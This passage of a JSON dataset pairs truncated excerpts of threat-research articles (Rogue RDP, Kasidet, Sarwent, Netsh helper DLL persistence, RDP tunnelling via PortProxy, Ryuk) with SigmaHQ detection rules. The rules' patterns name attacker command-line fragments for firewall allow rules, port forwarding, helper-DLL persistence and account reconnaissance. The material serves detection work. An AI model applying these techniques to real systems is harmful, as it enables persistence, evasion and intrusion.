    "url": "https://web.archive.org/web/20230726144748/https://blog.thickmints.dev/mintsights/detecting-rogue-rdp/",
    "markdown": "# Detecting Rogue RDP You won't believe what Sysmon missed with this new initial access technique! **March 27, 2022** ## Table of Contents - Introduction - Rogue RDP Technique - Signals - Detection Opportunities - Microsoft Defender for Endpoint - Splunk/Sysmon - Sysmon Visibility Gaps - Splunk Rules - Results - Summary --- ## Introduction Microsoft recently announced the disablement of VBA macros carrying the mark of the web, impacting the ease-of-use of this widespread initial access technique. BlackHillsInfosec wrote a blog post on a different technique that could help fill the void titled “Rogue RDP”. This post examines signals",
    "sigma_rule": {
      "title": "Mstsc.EXE Execution From Uncommon Parent",
      "id": "ff3b6b39-e765-42f9-bb2c-ea6761e0e0f6",
      "status": "test",
      "description": "Detects potential RDP connection via Mstsc using a local \".rdp\" file located in suspicious locations.",
      "references": [
        "https://www.blackhillsinfosec.com/rogue-rdp-revisiting-initial-access-methods/",
        "https://web.archive.org/web/20230726144748/https://blog.thickmints.dev/mintsights/detecting-rogue-rdp/"
      ],
      "author": "Nasreddine Bencherchali (Nextron Systems)",
      "date": "2023-04-18",
      "modified": "2023-04-18",
      "tags": [
        "attack.lateral-movement"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_parent": {
          "ParentImage|endswith": [
            "\\brave.exe",
            "\\CCleanerBrowser.exe",
            "\\chrome.exe",
            "\\chromium.exe",
            "\\firefox.exe",
            "\\iexplore.exe",
            "\\microsoftedge.exe",
            "\\msedge.exe",
            "\\opera.exe",
            "\\vivaldi.exe",
            "\\whale.exe",
            "\\outlook.exe"
          ]
        },
        "selection_img": [
          {
            "Image|endswith": "\\mstsc.exe"
          },
          {
            "OriginalFileName": "mstsc.exe"
          }
        ],
        "condition": "all of selection_*"
      },
      "falsepositives": [
        "Unlikely"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_mstsc_run_local_rpd_file_susp_parent.yml"
  },
  "273": {
    "url": "https://web.archive.org/web/20240124004840/https://www.virusradar.com/en/Win32_Kasidet.AD/description",
    "markdown": "# Win32/Kasidet [Threat Name] ## Win32/Kasidet.AD [Threat Variant Name] | **Category** | worm | | ------------ | ------------------------------------- | | **Size** | 295424 B | | **Aliases** | Trojan.Win32.SelfDel.blcu (Kaspersky) | | | Trojan.MulDrop6.16162 (Dr.Web) | | | Trojan:Win32/Dynamer!ac (Microsoft) | ### Short description Win32/Kasidet.AD serves as a backdoor. It can be controlled remotely. ### Installation The worm searches for files with the following file extensions: - `.exe` Only the following folders are searched: - `%windir%` It avoids files which contain any of the following strings in their path: - `install` - `setup` - `update` - `patch` The worm copies",
    "sigma_rule": {
      "title": "Suspicious Program Location Whitelisted In Firewall Via Netsh.EXE",
      "id": "a35f5a72-f347-4e36-8895-9869b0d5fc6d",
      "status": "test",
      "description": "Detects Netsh command execution that whitelists a program located in a suspicious location in the Windows Firewall",
      "references": [
        "https://web.archive.org/web/20240124004840/https://www.virusradar.com/en/Win32_Kasidet.AD/description",
        "https://www.hybrid-analysis.com/sample/07e789f4f2f3259e7559fdccb36e96814c2dbff872a21e1fa03de9ee377d581f?environmentId=100"
      ],
      "author": "Sander Wiebing, Jonhnathan Ribeiro, Daniil Yugoslavskiy, oscd.community",
      "date": "2020-05-25",
      "modified": "2023-12-11",
      "tags": [
        "attack.defense-evasion",
        "attack.t1562.004"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_img": [
          {
            "Image|endswith": "\\netsh.exe"
          },
          {
            "OriginalFileName": "netsh.exe"
          }
        ],
        "selection_cli": [
          {
            "CommandLine|contains|all": [
              "firewall",
              "add",
              "allowedprogram"
            ]
          },
          {
            "CommandLine|contains|all": [
              "advfirewall",
              "firewall",
              "add",
              "rule",
              "action=allow",
              "program="
            ]
          }
        ],
        "selection_paths": {
          "CommandLine|contains": [
            ":\\$Recycle.bin\\",
            ":\\RECYCLER.BIN\\",
            ":\\RECYCLERS.BIN\\",
            ":\\SystemVolumeInformation\\",
            ":\\Temp\\",
            ":\\Users\\Default\\",
            ":\\Users\\Desktop\\",
            ":\\Users\\Public\\",
            ":\\Windows\\addins\\",
            ":\\Windows\\cursors\\",
            ":\\Windows\\debug\\",
            ":\\Windows\\drivers\\",
            ":\\Windows\\fonts\\",
            ":\\Windows\\help\\",
            ":\\Windows\\system32\\tasks\\",
            ":\\Windows\\Tasks\\",
            ":\\Windows\\Temp\\",
            "\\Downloads\\",
            "\\Local Settings\\Temporary Internet Files\\",
            "\\Temporary Internet Files\\Content.Outlook\\",
            "%Public%\\",
            "%TEMP%",
            "%TMP%"
          ]
        },
        "condition": "all of selection_*"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_netsh_fw_allow_program_in_susp_location.yml"
  },
  "274": {
    "url": "https://www.hybrid-analysis.com/sample/07e789f4f2f3259e7559fdccb36e96814c2dbff872a21e1fa03de9ee377d581f?environmentId=100",
    "markdown": "",
    "sigma_rule": {
      "title": "Suspicious Program Location Whitelisted In Firewall Via Netsh.EXE",
      "id": "a35f5a72-f347-4e36-8895-9869b0d5fc6d",
      "status": "test",
      "description": "Detects Netsh command execution that whitelists a program located in a suspicious location in the Windows Firewall",
      "references": [
        "https://web.archive.org/web/20240124004840/https://www.virusradar.com/en/Win32_Kasidet.AD/description",
        "https://www.hybrid-analysis.com/sample/07e789f4f2f3259e7559fdccb36e96814c2dbff872a21e1fa03de9ee377d581f?environmentId=100"
      ],
      "author": "Sander Wiebing, Jonhnathan Ribeiro, Daniil Yugoslavskiy, oscd.community",
      "date": "2020-05-25",
      "modified": "2023-12-11",
      "tags": [
        "attack.defense-evasion",
        "attack.t1562.004"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_img": [
          {
            "Image|endswith": "\\netsh.exe"
          },
          {
            "OriginalFileName": "netsh.exe"
          }
        ],
        "selection_cli": [
          {
            "CommandLine|contains|all": [
              "firewall",
              "add",
              "allowedprogram"
            ]
          },
          {
            "CommandLine|contains|all": [
              "advfirewall",
              "firewall",
              "add",
              "rule",
              "action=allow",
              "program="
            ]
          }
        ],
        "selection_paths": {
          "CommandLine|contains": [
            ":\\$Recycle.bin\\",
            ":\\RECYCLER.BIN\\",
            ":\\RECYCLERS.BIN\\",
            ":\\SystemVolumeInformation\\",
            ":\\Temp\\",
            ":\\Users\\Default\\",
            ":\\Users\\Desktop\\",
            ":\\Users\\Public\\",
            ":\\Windows\\addins\\",
            ":\\Windows\\cursors\\",
            ":\\Windows\\debug\\",
            ":\\Windows\\drivers\\",
            ":\\Windows\\fonts\\",
            ":\\Windows\\help\\",
            ":\\Windows\\system32\\tasks\\",
            ":\\Windows\\Tasks\\",
            ":\\Windows\\Temp\\",
            "\\Downloads\\",
            "\\Local Settings\\Temporary Internet Files\\",
            "\\Temporary Internet Files\\Content.Outlook\\",
            "%Public%\\",
            "%TEMP%",
            "%TMP%"
          ]
        },
        "condition": "all of selection_*"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_netsh_fw_allow_program_in_susp_location.yml"
  },
  "275": {
    "url": "https://www.sentinelone.com/labs/sarwent-malware-continues-to-evolve-with-updated-command-functions/",
    "markdown": "# Sarwent Malware Continues to Evolve With Updated Command Functions **Date:** May 21, 2020 **Category:** Security Research --- *Sarwent has received little attention from researchers, but this backdoor malware is still being actively developed, with new commands and a focus on RDP.* ## Executive Summary - Updates to Sarwent malware show a continued interest in backdoor functionality such as executing PowerShell commands. - Updates also show a preference for using RDP. - Sarwent has been seen using the same binary signer as at least one TrickBot operator[^1]. ## Background Sarwent appears to have been actively used since at least 2018",
    "sigma_rule": {
      "title": "RDP Connection Allowed Via Netsh.EXE",
      "id": "01aeb693-138d-49d2-9403-c4f52d7d3d62",
      "status": "test",
      "description": "Detects usage of the netsh command to open and allow connections to port 3389 (RDP). As seen used by Sarwent Malware",
      "references": [
        "https://www.sentinelone.com/labs/sarwent-malware-continues-to-evolve-with-updated-command-functions/"
      ],
      "author": "Sander Wiebing",
      "date": "2020-05-23",
      "modified": "2023-12-11",
      "tags": [
        "attack.defense-evasion",
        "attack.t1562.004"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_img": [
          {
            "Image|endswith": "\\netsh.exe"
          },
          {
            "OriginalFileName": "netsh.exe"
          }
        ],
        "selection_cli": {
          "CommandLine|contains|all": [
            "firewall ",
            "add ",
            "tcp ",
            "3389"
          ],
          "CommandLine|contains": [
            "portopening",
            "allow"
          ]
        },
        "condition": "all of selection_*"
      },
      "falsepositives": [
        "Legitimate administration activity"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_netsh_fw_allow_rdp.yml"
  },
  "276": {
    "url": "https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1546.007/T1546.007.md",
    "markdown": "# T1546.007 - Netsh Helper DLL ## Description from ATT&CK Adversaries may establish persistence by executing malicious content triggered by Netsh Helper DLLs. Netsh.exe (also referred to as Netshell) is a command-line scripting utility used to interact with the network configuration of a system. It contains functionality to add helper DLLs for extending functionality of the utility. (Citation: TechNet Netsh) The paths to registered netsh.exe helper DLLs are entered into the Windows Registry at `HKLM\\SOFTWARE\\Microsoft\\Netsh`. Adversaries can use netsh.exe helper DLLs to trigger execution of arbitrary code in a persistent manner. This execution would take place anytime netsh.exe is executed,",
    "sigma_rule": {
      "title": "Potential Persistence Via Netsh Helper DLL",
      "id": "56321594-9087-49d9-bf10-524fe8479452",
      "related": [
        {
          "id": "c90362e0-2df3-4e61-94fe-b37615814cb1",
          "type": "similar"
        },
        {
          "id": "e7b18879-676e-4a0e-ae18-27039185a8e7",
          "type": "similar"
        }
      ],
      "status": "test",
      "description": "Detects the execution of netsh with \"add helper\" flag in order to add a custom helper DLL. This technique can be abused to add a malicious helper DLL that can be used as a persistence proxy that gets called when netsh.exe is executed.\n",
      "references": [
        "https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1546.007/T1546.007.md",
        "https://github.com/outflanknl/NetshHelperBeacon",
        "https://web.archive.org/web/20160928212230/https://www.adaptforward.com/2016/09/using-netshell-to-execute-evil-dlls-and-persist-on-a-host/"
      ],
      "author": "Victor Sergeev, oscd.community",
      "date": "2019-10-25",
      "modified": "2023-11-28",
      "tags": [
        "attack.privilege-escalation",
        "attack.persistence",
        "attack.t1546.007",
        "attack.s0108"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_img": [
          {
            "OriginalFileName": "netsh.exe"
          },
          {
            "Image|endswith": "\\netsh.exe"
          }
        ],
        "selection_cli": {
          "CommandLine|contains|all": [
            "add",
            "helper"
          ]
        },
        "condition": "all of selection_*"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_netsh_helper_dll_persistence.yml"
  },
  "277": {
    "url": "https://github.com/outflanknl/NetshHelperBeacon",
    "markdown": "# NetshHelperBeacon DLL to load from Windows NetShell. Will pop calc and execute shellcode. ## Background It turns out Windows NetShell (netsh) allows loading of external DLLs. But you can't just load any regular DLL. For successful loading, netsh requires the `InitHelperDll` entry point to exist. Once loaded, the DLL will execute every time netsh is executed. I got the idea after reading a blog post and wanted to verify and test its usefulness by making a PoC that executes Cobalt Strike beacon code. ## How to use - *Yolo mode*: load `(x64)Release\\NetshHelperBeacon.dll` on your production machine. - Fire up",
    "sigma_rule": {
      "title": "Potential Persistence Via Netsh Helper DLL",
      "id": "56321594-9087-49d9-bf10-524fe8479452",
      "related": [
        {
          "id": "c90362e0-2df3-4e61-94fe-b37615814cb1",
          "type": "similar"
        },
        {
          "id": "e7b18879-676e-4a0e-ae18-27039185a8e7",
          "type": "similar"
        }
      ],
      "status": "test",
      "description": "Detects the execution of netsh with \"add helper\" flag in order to add a custom helper DLL. This technique can be abused to add a malicious helper DLL that can be used as a persistence proxy that gets called when netsh.exe is executed.\n",
      "references": [
        "https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1546.007/T1546.007.md",
        "https://github.com/outflanknl/NetshHelperBeacon",
        "https://web.archive.org/web/20160928212230/https://www.adaptforward.com/2016/09/using-netshell-to-execute-evil-dlls-and-persist-on-a-host/"
      ],
      "author": "Victor Sergeev, oscd.community",
      "date": "2019-10-25",
      "modified": "2023-11-28",
      "tags": [
        "attack.privilege-escalation",
        "attack.persistence",
        "attack.t1546.007",
        "attack.s0108"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_img": [
          {
            "OriginalFileName": "netsh.exe"
          },
          {
            "Image|endswith": "\\netsh.exe"
          }
        ],
        "selection_cli": {
          "CommandLine|contains|all": [
            "add",
            "helper"
          ]
        },
        "condition": "all of selection_*"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_netsh_helper_dll_persistence.yml"
  },
  "278": {
    "url": "https://web.archive.org/web/20160928212230/https://www.adaptforward.com/2016/09/using-netshell-to-execute-evil-dlls-and-persist-on-a-host/",
    "markdown": "# Using NetShell to execute evil DLLs and persist on a host I’m always looking for ways an adversary can execute something on a system via “trusted” methods. One great example is Powershell. It’s beloved by sysadmins and hackers alike. AV won’t care and Virustotal says it’s squeaky clean. I’m not going to go into all the various avenues of attack via Powershell because I’ll be here all night. Just know that anything that’s available to your users/staff is available to an attacker. After all, once someone gets into your network, what separates them from a legitimate user? Nothing. Any",
    "sigma_rule": {
      "title": "Potential Persistence Via Netsh Helper DLL",
      "id": "56321594-9087-49d9-bf10-524fe8479452",
      "related": [
        {
          "id": "c90362e0-2df3-4e61-94fe-b37615814cb1",
          "type": "similar"
        },
        {
          "id": "e7b18879-676e-4a0e-ae18-27039185a8e7",
          "type": "similar"
        }
      ],
      "status": "test",
      "description": "Detects the execution of netsh with \"add helper\" flag in order to add a custom helper DLL. This technique can be abused to add a malicious helper DLL that can be used as a persistence proxy that gets called when netsh.exe is executed.\n",
      "references": [
        "https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1546.007/T1546.007.md",
        "https://github.com/outflanknl/NetshHelperBeacon",
        "https://web.archive.org/web/20160928212230/https://www.adaptforward.com/2016/09/using-netshell-to-execute-evil-dlls-and-persist-on-a-host/"
      ],
      "author": "Victor Sergeev, oscd.community",
      "date": "2019-10-25",
      "modified": "2023-11-28",
      "tags": [
        "attack.privilege-escalation",
        "attack.persistence",
        "attack.t1546.007",
        "attack.s0108"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_img": [
          {
            "OriginalFileName": "netsh.exe"
          },
          {
            "Image|endswith": "\\netsh.exe"
          }
        ],
        "selection_cli": {
          "CommandLine|contains|all": [
            "add",
            "helper"
          ]
        },
        "condition": "all of selection_*"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_netsh_helper_dll_persistence.yml"
  },
  "279": {
    "url": "https://cloud.google.com/blog/topics/threat-intelligence/bypassing-network-restrictions-through-rdp-tunneling/",
    "markdown": "# Bypassing Network Restrictions Through RDP Tunneling **January 24, 2019** --- Remote Desktop Services is a component of Microsoft Windows that is used by various companies for the convenience it offers systems administrators, engineers, and remote employees. On the other hand, Remote Desktop Services, and specifically the Remote Desktop Protocol (RDP), offers this same convenience to remote threat actors during targeted system compromises. When sophisticated threat actors establish a foothold and acquire ample logon credentials, they may switch from backdoors to using direct RDP sessions for remote access. When malware is removed from the equation, intrusions become increasingly difficult to",
    "sigma_rule": {
      "title": "New Port Forwarding Rule Added Via Netsh.EXE",
      "id": "322ed9ec-fcab-4f67-9a34-e7c6aef43614",
      "status": "test",
      "description": "Detects the execution of netsh commands that configure a new port forwarding (PortProxy) rule",
      "references": [
        "https://cloud.google.com/blog/topics/threat-intelligence/bypassing-network-restrictions-through-rdp-tunneling/",
        "https://adepts.of0x.cc/netsh-portproxy-code/",
        "https://www.dfirnotes.net/portproxy_detection/"
      ],
      "author": "Florian Roth (Nextron Systems), omkar72, oscd.community, Swachchhanda Shrawan Poudel",
      "date": "2019-01-29",
      "modified": "2023-09-01",
      "tags": [
        "attack.lateral-movement",
        "attack.defense-evasion",
        "attack.command-and-control",
        "attack.t1090"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_img": [
          {
            "Image|endswith": "\\netsh.exe"
          },
          {
            "OriginalFileName": "netsh.exe"
          }
        ],
        "selection_cli_1": {
          "CommandLine|contains|all": [
            "interface",
            "portproxy",
            "add",
            "v4tov4"
          ]
        },
        "selection_cli_2": {
          "CommandLine|contains|all": [
            "i ",
            "p ",
            "a ",
            "v "
          ]
        },
        "selection_cli_3": {
          "CommandLine|contains|all": [
            "connectp",
            "listena",
            "c="
          ]
        },
        "condition": "selection_img and 1 of selection_cli_*"
      },
      "falsepositives": [
        "Legitimate administration activity",
        "WSL2 network bridge PowerShell script used for WSL/Kubernetes/Docker (e.g. https://github.com/microsoft/WSL/issues/4150#issuecomment-504209723)"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_netsh_port_forwarding.yml"
  },
  "280": {
    "url": "https://adepts.of0x.cc/netsh-portproxy-code/",
    "markdown": "# Don't use commands, use code: the tale of Netsh & PortProxy **Published on:** Jun 11, 2021 Dear Fellowship, today’s homily is a call to an (un)holy crusade: we have to banish the usage of commands in compromised machines and start to embrace coding. Please, take a seat and listen to the story of netsh and PortProxy. ## Prayers at the foot of the Altar a.k.a. disclaimer *The intention of this short article is to encourage people to improve their tradecraft. We use netsh here as a mere example to transmit the core idea: we need to move from commands",
    "sigma_rule": {
      "title": "New Port Forwarding Rule Added Via Netsh.EXE",
      "id": "322ed9ec-fcab-4f67-9a34-e7c6aef43614",
      "status": "test",
      "description": "Detects the execution of netsh commands that configure a new port forwarding (PortProxy) rule",
      "references": [
        "https://cloud.google.com/blog/topics/threat-intelligence/bypassing-network-restrictions-through-rdp-tunneling/",
        "https://adepts.of0x.cc/netsh-portproxy-code/",
        "https://www.dfirnotes.net/portproxy_detection/"
      ],
      "author": "Florian Roth (Nextron Systems), omkar72, oscd.community, Swachchhanda Shrawan Poudel",
      "date": "2019-01-29",
      "modified": "2023-09-01",
      "tags": [
        "attack.lateral-movement",
        "attack.defense-evasion",
        "attack.command-and-control",
        "attack.t1090"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_img": [
          {
            "Image|endswith": "\\netsh.exe"
          },
          {
            "OriginalFileName": "netsh.exe"
          }
        ],
        "selection_cli_1": {
          "CommandLine|contains|all": [
            "interface",
            "portproxy",
            "add",
            "v4tov4"
          ]
        },
        "selection_cli_2": {
          "CommandLine|contains|all": [
            "i ",
            "p ",
            "a ",
            "v "
          ]
        },
        "selection_cli_3": {
          "CommandLine|contains|all": [
            "connectp",
            "listena",
            "c="
          ]
        },
        "condition": "selection_img and 1 of selection_cli_*"
      },
      "falsepositives": [
        "Legitimate administration activity",
        "WSL2 network bridge PowerShell script used for WSL/Kubernetes/Docker (e.g. https://github.com/microsoft/WSL/issues/4150#issuecomment-504209723)"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_netsh_port_forwarding.yml"
  },
  "281": {
    "url": "https://www.dfirnotes.net/portproxy_detection/",
    "markdown": "# Port Proxy detection ## How can we see port proxy configurations in DFIR? I came across a new (to me) technique for evasion and persistence reading news today. The report(1) specifically called out the clever use of built in Windows service control and network utilities (sc, netsh) by some attackers they’d investigated. After Googling for a few minutes it was clear that this technique is known to Windows sysadmins and the attacker community (as it is featured in a Metasploit module(2). So, let’s run the process: create the behaviour in the lab, look for the artifacts, and then figure",
    "sigma_rule": {
      "title": "New Port Forwarding Rule Added Via Netsh.EXE",
      "id": "322ed9ec-fcab-4f67-9a34-e7c6aef43614",
      "status": "test",
      "description": "Detects the execution of netsh commands that configure a new port forwarding (PortProxy) rule",
      "references": [
        "https://cloud.google.com/blog/topics/threat-intelligence/bypassing-network-restrictions-through-rdp-tunneling/",
        "https://adepts.of0x.cc/netsh-portproxy-code/",
        "https://www.dfirnotes.net/portproxy_detection/"
      ],
      "author": "Florian Roth (Nextron Systems), omkar72, oscd.community, Swachchhanda Shrawan Poudel",
      "date": "2019-01-29",
      "modified": "2023-09-01",
      "tags": [
        "attack.lateral-movement",
        "attack.defense-evasion",
        "attack.command-and-control",
        "attack.t1090"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_img": [
          {
            "Image|endswith": "\\netsh.exe"
          },
          {
            "OriginalFileName": "netsh.exe"
          }
        ],
        "selection_cli_1": {
          "CommandLine|contains|all": [
            "interface",
            "portproxy",
            "add",
            "v4tov4"
          ]
        },
        "selection_cli_2": {
          "CommandLine|contains|all": [
            "i ",
            "p ",
            "a ",
            "v "
          ]
        },
        "selection_cli_3": {
          "CommandLine|contains|all": [
            "connectp",
            "listena",
            "c="
          ]
        },
        "condition": "selection_img and 1 of selection_cli_*"
      },
      "falsepositives": [
        "Legitimate administration activity",
        "WSL2 network bridge PowerShell script used for WSL/Kubernetes/Docker (e.g. https://github.com/microsoft/WSL/issues/4150#issuecomment-504209723)"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_netsh_port_forwarding.yml"
  },
  "282": {
    "url": "https://cloud.google.com/blog/topics/threat-intelligence/bypassing-network-restrictions-through-rdp-tunneling/",
    "markdown": "# Bypassing Network Restrictions Through RDP Tunneling **January 24, 2019** --- Remote Desktop Services is a component of Microsoft Windows that is used by various companies for the convenience it offers systems administrators, engineers, and remote employees. On the other hand, Remote Desktop Services, and specifically the Remote Desktop Protocol (RDP), offers this same convenience to remote threat actors during targeted system compromises. When sophisticated threat actors establish a foothold and acquire ample logon credentials, they may switch from backdoors to using direct RDP sessions for remote access. When malware is removed from the equation, intrusions become increasingly difficult to",
    "sigma_rule": {
      "title": "RDP Port Forwarding Rule Added Via Netsh.EXE",
      "id": "782d6f3e-4c5d-4b8c-92a3-1d05fed72e63",
      "status": "test",
      "description": "Detects the execution of netsh to configure a port forwarding of port 3389 (RDP) rule",
      "references": [
        "https://cloud.google.com/blog/topics/threat-intelligence/bypassing-network-restrictions-through-rdp-tunneling/"
      ],
      "author": "Florian Roth (Nextron Systems), oscd.community",
      "date": "2019-01-29",
      "modified": "2023-02-13",
      "tags": [
        "attack.lateral-movement",
        "attack.defense-evasion",
        "attack.command-and-control",
        "attack.t1090"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_img": [
          {
            "Image|endswith": "\\netsh.exe"
          },
          {
            "OriginalFileName": "netsh.exe"
          }
        ],
        "selection_cli": {
          "CommandLine|contains|all": [
            " i",
            " p",
            "=3389",
            " c"
          ]
        },
        "condition": "all of selection_*"
      },
      "falsepositives": [
        "Legitimate administration activity"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_netsh_port_forwarding_3389.yml"
  },
  "283": {
    "url": "https://redcanary.com/blog/how-one-hospital-thwarted-a-ryuk-ransomware-outbreak/",
    "markdown": "# A Bazar start: How one hospital thwarted a Ryuk ransomware outbreak These 10 detection opportunities helped detect and prevent a ransomware outbreak at a medical center. **Originally published** October 29, 2020. **Last modified** April 30, 2024. --- In mid-October, a variety of detection analytics alerted the Red Canary CIRT to execution, reconnaissance, and lateral movement activity on the network of a medical center. Within minutes, we observed Cobalt Strike and other malicious tools that all pointed toward a troubling conclusion: the hospital was probably a few hours away from a full-blown Ryuk ransomware outbreak. Thanks in no small part",
    "sigma_rule": {
      "title": "Suspicious Group And Account Reconnaissance Activity Using Net.EXE",
      "id": "d95de845-b83c-4a9a-8a6a-4fc802ebf6c0",
      "status": "test",
      "description": "Detects suspicious reconnaissance command line activity on Windows systems using Net.EXE\nCheck if the user that executed the commands is suspicious (e.g. service accounts, LOCAL_SYSTEM)\n",
      "references": [
        "https://redcanary.com/blog/how-one-hospital-thwarted-a-ryuk-ransomware-outbreak/",
        "https://thedfirreport.com/2020/10/18/ryuk-in-5-hours/",
        "https://research.nccgroup.com/2022/08/19/back-in-black-unlocking-a-lockbit-3-0-ransomware-attack/"
      ],
      "author": "Florian Roth (Nextron Systems), omkar72, @svch0st, Nasreddine Bencherchali (Nextron Systems)",
      "date": "2019-01-16",
      "modified": "2023-03-02",
      "tags": [
        "attack.discovery",
        "attack.t1087.001",
        "attack.t1087.002"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_img": [
          {
            "Image|endswith": [
              "\\net.exe",
              "\\net1.exe"
            ]
          },
          {
            "OriginalFileName": [
              "net.exe",
              "net1.exe"
            ]
          }
        ],
        "selection_group_root": {
          "CommandLine|contains": [
            " group ",
            " localgroup "
          ]
        },
        "selection_group_flags": {
          "CommandLine|contains": [
            "domain admins",
            " administrator",
            " administrateur",
            "enterprise admins",
            "Exchange Trusted Subsystem",
            "Remote Desktop Users",
            "Utilisateurs du Bureau à distance",
            "Usuarios de escritorio remoto",
            " /do"
          ]
        },
        "filter_group_add": {
          "CommandLine|contains": " /add"
        },
        "selection_accounts_root": {
          "CommandLine|contains": " accounts "
        },
        "selection_accounts_flags": {
          "CommandLine|contains": " /do"
        },
        "condition": "selection_img and ((all of selection_group_* and not filter_group_add) or all of selection_accounts_*)"
      },
      "falsepositives": [
        "Inventory tool runs",
        "Administrative activity"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_net_groups_and_accounts_recon.yml"
  },
  "284": {
    "url": "https://thedfirreport.com/2020/10/18/ryuk-in-5-hours/",
    "markdown": "# Ryuk in 5 Hours **Categories:** adfind bazar cobaltstrike ransomware rdp ryuk yara **Published on:** October 18, 2020 ## Intro The Ryuk threat actors went from a phishing email to domain-wide ransomware in 5 hours. They escalated privileges using Zerologon (CVE-2020-1472), less than 2 hours after the initial phish. They used tools such as Cobalt Strike, AdFind, WMI, and PowerShell to accomplish their objective. Ryuk has been one of the most proficient ransomware gangs in the past few years, with the FBI claiming $61 million USD having been paid to the group as of February 2020. Earlier in the year,",
    "sigma_rule": {
      "title": "Suspicious Group And Account Reconnaissance Activity Using Net.EXE",
      "id": "d95de845-b83c-4a9a-8a6a-4fc802ebf6c0",
      "status": "test",
      "description": "Detects suspicious reconnaissance command line activity on Windows systems using Net.EXE\nCheck if the user that executed the commands is suspicious (e.g. service accounts, LOCAL_SYSTEM)\n",
      "references": [
        "https://redcanary.com/blog/how-one-hospital-thwarted-a-ryuk-ransomware-outbreak/",
        "https://thedfirreport.com/2020/10/18/ryuk-in-5-hours/",
        "https://research.nccgroup.com/2022/08/19/back-in-black-unlocking-a-lockbit-3-0-ransomware-attack/"
      ],
      "author": "Florian Roth (Nextron Systems), omkar72, @svch0st, Nasreddine Bencherchali (Nextron Systems)",
      "date": "2019-01-16",
      "modified": "2023-03-02",
      "tags": [
        "attack.discovery",
        "attack.t1087.001",
        "attack.t1087.002"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_img": [
          {
            "Image|endswith": [
              "\\net.exe",
              "\\net1.exe"
            ]
          },
          {
            "OriginalFileName": [
              "net.exe",
              "net1.exe"
            ]
          }
        ],
        "selection_group_root": {
          "CommandLine|contains": [
            " group ",
            " localgroup "
          ]
        },
        "selection_group_flags": {
          "CommandLine|contains": [
            "domain admins",
            " administrator",
            " administrateur",
            "enterprise admins",
            "Exchange Trusted Subsystem",
            "Remote Desktop Users",
            "Utilisateurs du Bureau à distance",
            "Usuarios de escritorio remoto",
            " /do"
          ]
        },
        "filter_group_add": {
          "CommandLine|contains": " /add"
        },
        "selection_accounts_root": {
          "CommandLine|contains": " accounts "
        },
        "selection_accounts_flags": {
          "CommandLine|contains": " /do"
        },
        "condition": "selection_img and ((all of selection_group_* and not filter_group_add) or all of selection_accounts_*)"
      },
      "falsepositives": [
        "Inventory tool runs",
        "Administrative activity"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_net_groups_and_accounts_recon.yml"
  },
  "285": {
    "url": "https://research.nccgroup.com/2022/08/19/back-in-black-unlocking-a-lockbit-3-0-ransomware-attack/",
